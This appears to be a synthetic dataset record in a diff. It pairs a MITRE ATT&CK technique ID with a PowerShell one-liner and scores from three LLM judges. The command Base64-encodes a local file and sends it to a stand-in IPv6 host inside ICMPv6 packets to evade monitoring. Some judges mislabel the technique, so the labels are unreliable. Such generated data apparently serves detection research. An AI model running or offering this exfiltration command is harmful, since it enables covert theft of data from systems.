@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
+  "explanation": "Sends the first chunk of Base64-encoded data inside an ICMPv6 Echo payload, diverging from typical TCP-based channels and fitting T1011 behavior. Chunk labeling supports multi-packet exfil.",
+  "rationale_steps": [
+    "Create a manageable Base64 chunk with a simple label.",
+    "Transmit via ICMPv6 to avoid standard TCP/HTTP monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-7fdda75d",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, valid method calls, and correct PowerShell syntax throughout.",
+        "semantic_score": 2,
+        "semantic_justification": "The command implements data exfiltration over ICMP (T1048.003) rather than data destruction (T1485/T1011), as it reads and transmits file content without destroying any data.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:19:10.847286Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell commands for reading a file, Base64 encoding, and substring manipulation are perfectly formed, and the `nping.exe` call uses valid arguments for sending data via ICMPv6.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration by sending file contents via ICMPv6, which is an operation entirely unrelated to the T1011 Data Destruction technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:19:21.685490Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell is well-formed with balanced quotes/parentheses, proper separators, and valid nping flags/argument formatting.",
+        "semantic_score": 4,
+        "semantic_justification": "It base64-reads a file, chunks it, and exfiltrates via an ICMPv6 Echo payload using nping as claimed, though success depends on nping/Npcap presence and likely elevated privileges on Windows.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:19:52.808992Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
